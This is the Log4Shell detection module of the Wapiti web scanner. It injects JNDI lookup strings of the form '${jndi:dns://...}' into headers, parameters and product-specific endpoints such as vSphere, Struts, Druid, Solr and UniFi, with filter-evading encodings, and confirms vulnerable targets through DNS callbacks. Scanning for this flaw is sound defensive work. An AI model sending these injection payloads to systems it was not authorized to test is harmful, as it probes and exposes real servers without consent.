#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# This file is part of the Wapiti project (https://wapiti-scanner.github.io)
# Copyright (C) 2021-2024 Cyberwatch
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
import copy
import socket
import uuid
from os.path import join as path_join
from typing import Dict, List, Tuple, Optional

import dns.resolver
from httpx import RequestError
from wapitiCore.attack.attack import Attack
from wapitiCore.definitions.log4shell import Log4ShellFinding
from wapitiCore.main.log import log_red, logging, log_verbose
from wapitiCore.net.response import Response
from wapitiCore.net import Request


class ModuleLog4Shell(Attack):
    """
    Detect the Log4Shell vulnerability (CVE-2021-44228)
    """

    name = "log4shell"
    do_get = True
    do_post = True

    HEADERS_FILE = "log4shell_headers.txt"

    VSPHERE_URL = "websso/SAML2/SSO"
    DRUID_URL = "druid/coordinator/v1/lookups/config/"
    SOLR_URL = "solr/admin/cores"
    UNIFI_URL = "api/login"

    def __init__(self, crawler, persister, attack_options, stop_event, crawler_configuration):
        Attack.__init__(self, crawler, persister, attack_options, stop_event, crawler_configuration)

        dns_endpoint = attack_options.get("dns_endpoint")
        try:
            self._dns_host = socket.gethostbyname(dns_endpoint)
        except (OSError, TypeError):
            logging.error(f"Error: {dns_endpoint} is not a valid domain name")
            self.finished = True

    async def must_attack(self, request: Request, response: Optional[Response] = None):
        if self.finished is True:
            return False
        return True

    async def read_headers(self) -> List[str]:
        with open(path_join(self.DATA_DIR, self.HEADERS_FILE), encoding='utf-8') as headers_file:
            return headers_file.read().strip().split("\n")

    async def _attack_vsphere_url(self, original_request: Request):
        header_target = "X-Forwarded-For"

        malicious_request = Request(
            path=original_request.url,
            method=original_request.method,
            get_params=[["SAMLRequest", ""]],
            referer=original_request.referer,
            link_depth=original_request.link_depth
        )
        payload_unique_id = uuid.uuid4()
        payload = self._generate_payload(payload_unique_id)
        malicious_headers = {header_target: payload}

        try:
            log_verbose(f"[¨] {malicious_request}")
            response = await self.crawler.async_send(malicious_request, malicious_headers, follow_redirects=True)
        except RequestError:
            self.network_errors += 1
            return
        await self._verify_header_vulnerability(malicious_request, header_target, payload, payload_unique_id, response)

    async def _attack_unifi_url(self, request_url: str):

        payload_unique_id = uuid.uuid4()
        payload = self._generate_payload(payload_unique_id)

        malicious_request_username = Request(
            path=request_url,
            method="POST",
            enctype="application/json",
            post_params=f'{{"username": "{payload}", "password": "Letm3in_", "remember": false, "strict": true}}'
        )

        malicious_request_remember = Request(
            path=request_url,
            method="POST",
            enctype="application/json",
            post_params=f'{{"username": "alice", "password": "Letm3in_", "remember": "{payload}", "strict": true}}'
        )

        try:
            log_verbose(f"[¨] {malicious_request_username}")
            response = await self.crawler.async_send(malicious_request_username, follow_redirects=True)
            await self._verify_param_vulnerability(malicious_request_username, payload_unique_id, "username", response)
        except RequestError:
            self.network_errors += 1

        try:
            log_verbose(f"[¨] {malicious_request_remember}")
            response = await self.crawler.async_send(malicious_request_remember, follow_redirects=True)
            await self._verify_param_vulnerability(malicious_request_remember, payload_unique_id, "remember", response)
        except RequestError:
            self.network_errors += 1

    async def attack_apache_solr_url(self, request_url: str):
        payload_unique_id = uuid.uuid4()
        payload = self._generate_payload(payload_unique_id).replace("{", "%7B").replace("}", "%7D")
        query = f"action=CREATE&name={payload}&wt=json"

        malicious_request = Request(path=request_url + "?" + query, method="GET", get_params=None)

        try:
            log_verbose(f"[¨] {malicious_request}")
            response = await self.crawler.async_send(malicious_request, follow_redirects=True)
        except RequestError:
            self.network_errors += 1
            return
        await self._verify_param_vulnerability(malicious_request, payload_unique_id, "name", response)

    async def _attack_apache_struts(self, request_url: str):
        payload_unique_id = uuid.uuid4()

        # Here we need to replace "//" by "$%7B::-/%7D/" because Apache Struts will replace "//" by "/"
        # and with these special characters it will keep "//"
        payload = self._generate_payload(payload_unique_id).replace("//", "$%7B::-/%7D/")

        modified_request = Request(request_url + ("" if request_url.endswith("/") else "/") + payload + "/")

        try:
            log_verbose(f"[¨] {modified_request}")
            page = await self.crawler.async_send(modified_request, follow_redirects=True)
        except RequestError:
            self.network_errors += 1
            return
        await self._verify_url_vulnerability(modified_request, payload_unique_id, page)

    async def _attack_apache_druid_url(self, request_url: str):
        payload_unique_id = uuid.uuid4()
        payload = self._generate_payload(payload_unique_id).replace("{", "%7B").replace("}", "%7D").replace("/", "%2f")

        malicious_request = Request(path=request_url + payload, method="DELETE")

        try:
            log_verbose(f"[¨] {malicious_request}")
            page = await self.crawler.async_send(malicious_request, follow_redirects=True)
        except RequestError:
            self.network_errors += 1
            return
        await self._verify_url_vulnerability(malicious_request, payload_unique_id, page)

    async def _attack_specific_cases(self, request: Request):
        root_url = await self.persister.get_root_url()

        if request.url == root_url:
            current_url = request.url + ("" if request.url.endswith("/") else "/")

            vsphere_request = Request(
                path=current_url + self.VSPHERE_URL,
                method=request.method,
                referer=request.referer,
                link_depth=request.link_depth
            )
            await self._attack_vsphere_url(vsphere_request)
            await self._attack_apache_struts(request.url)
            await self._attack_apache_druid_url(current_url + self.DRUID_URL)
            await self.attack_apache_solr_url(current_url + self.SOLR_URL)
            await self._attack_unifi_url(current_url + self.UNIFI_URL)
        await self._attack_vsphere_url(request)

    async def attack(self, request: Request, response: Optional[Response] = None):
        await self._attack_specific_cases(request)
        headers = await self.read_headers()

        batch_malicious_headers, headers_uuid_record = self._get_batch_malicious_headers(headers)

        for malicious_headers in batch_malicious_headers:

            modified_request = Request(request.url)

            try:
                log_verbose(f"[¨] {modified_request}")
                page = await self.crawler.async_send(modified_request, malicious_headers, follow_redirects=True)
            except RequestError:
                self.network_errors += 1
                continue
            await self._verify_headers_vulnerability(modified_request, malicious_headers, headers_uuid_record, page)

        all_params = [request.get_params]
        if request.post_params and not request.is_json:
            all_params.append(request.post_params)

        for parameters_list in all_params:
            for malicious_request, param_name, param_uuid in self._inject_payload(request, parameters_list):
                try:
                    log_verbose(f"[¨] {malicious_request}")
                    page = await self.crawler.async_send(malicious_request, follow_redirects=True)
                except RequestError:
                    self.network_errors += 1
                    continue
                await self._verify_param_vulnerability(malicious_request, param_uuid, param_name, page)

    async def _verify_param_vulnerability(
            self,
            request: Request,
            param_uuid: uuid.UUID,
            param_name: str,
            response: Response
    ):
        if not await self._verify_dns(str(param_uuid)):
            return

        element_type = "query parameter" if request.method == "GET" else "body parameter"

        await self.add_critical(
            finding_class=Log4ShellFinding,
            request=request,
            info=f"URL {request.url} seems vulnerable to Log4Shell attack by using the {element_type} {param_name}",
            parameter=f"{param_name}",
            response=response
        )

        log_red("---")
        log_red(
            f"URL {request.url} seems vulnerable to Log4Shell attack by using the {element_type} {param_name}")
        log_red(request.http_repr())
        log_red("---")

    async def _verify_headers_vulnerability(
        self,
        modified_request: Request,
        malicious_headers: dict,
        headers_uuid_record: dict,
        response: Response
    ):
        for header, payload in malicious_headers.items():
            header_uuid = headers_uuid_record.get(header)
            await self._verify_header_vulnerability(modified_request, header, payload, header_uuid, response)

    async def _verify_header_vulnerability(
        self,
        modified_request: Request,
        header: str,
        payload: str,
        unique_id: uuid.UUID,
        response: Response
    ):
        if await self._verify_dns(str(unique_id)) is True:
            await self.add_critical(
                finding_class=Log4ShellFinding,
                request=modified_request,
                info=f"URL {modified_request.url} seems vulnerable to Log4Shell attack by using the header {header}",
                parameter=f"{header}: {payload}",
                response=response
            )

            log_red("---")
            log_red(
                f"URL {modified_request.url} seems vulnerable to Log4Shell attack by using the header {header}"
            )
            log_red(modified_request.http_repr())
            log_red("---")

    async def _verify_url_vulnerability(self, request: Request, param_uuid: uuid.UUID, response: Response):
        if not await self._verify_dns(str(param_uuid)):
            return

        await self.add_critical(
            finding_class=Log4ShellFinding,
            request=request,
            info=f"URL {request.url} seems vulnerable to Log4Shell attack",
            parameter="",
            response=response
        )

        log_red("---")
        log_red(f"URL {request.url} seems vulnerable to Log4Shell attack")
        log_red(request.http_repr())
        log_red("---")

    async def _verify_dns(self, header_uuid: str) -> bool:
        try:
            resolver = dns.resolver.Resolver(configure=False)
            resolver.nameservers = [self._dns_host]
            answer = resolver.resolve(header_uuid + ".c", "TXT")

            return answer[0].strings[0].decode("utf-8") == "true"
        except dns.resolver.LifetimeTimeout:
            logging.error(f"Error: DNS server {self._dns_host} is not responding (timeout)")
            self.finished = True
            return False
        except dns.resolver.NoNameservers:
            logging.error(f"Error: DNS server {self._dns_host} is unreachable")
            self.finished = True
            return False

    def _get_batch_malicious_headers(self, headers: List[str]) -> Tuple[Dict, Dict]:
        batch_malicious_headers: List[Dict[str, str]] = []
        headers_uuid_record = {}
        batch_size = 10

        # Creates batch of batch_size elements
        headers_batch = [headers[i:i + batch_size]
                         for i in range(0, len(headers), batch_size)]

        # Creates a UUID for each header
        for header_batch in headers_batch:
            malicious_header = {}

            for header in header_batch:
                header_uuid = uuid.uuid4()
                malicious_header[header] = self._generate_payload(header_uuid)
                headers_uuid_record[header] = header_uuid
            batch_malicious_headers.append(malicious_header)

        return batch_malicious_headers, headers_uuid_record

    def _inject_payload(
            self,
            original_request: Request,
            params: List[Tuple[str, str]],
    ) -> Tuple[Request, str, uuid.UUID]:
        for idx, _ in enumerate(params):
            malicious_params = copy.deepcopy(params)

            param_uuid = uuid.uuid4()
            param_name = malicious_params[idx][0]

            malicious_params[idx][1] = self._generate_payload(param_uuid)

            malicious_request = Request(
                path=original_request.url,
                method=original_request.method,
                post_params=malicious_params if original_request.method == "POST" else original_request.post_params,
                get_params=malicious_params if original_request.method == "GET" else original_request.get_params,
                referer=original_request.referer,
                link_depth=original_request.link_depth
            )
            yield malicious_request, param_name, param_uuid

    def _generate_payload(self, unique_id: uuid.UUID) -> str:
        # The payload needs to be split because we are using the formatted string syntax to modify it dynamically,
        # but it is also using this syntax for the exploit.
        return "${jndi:dns://" + f"{self.dns_endpoint}/{unique_id}" + ".l}"
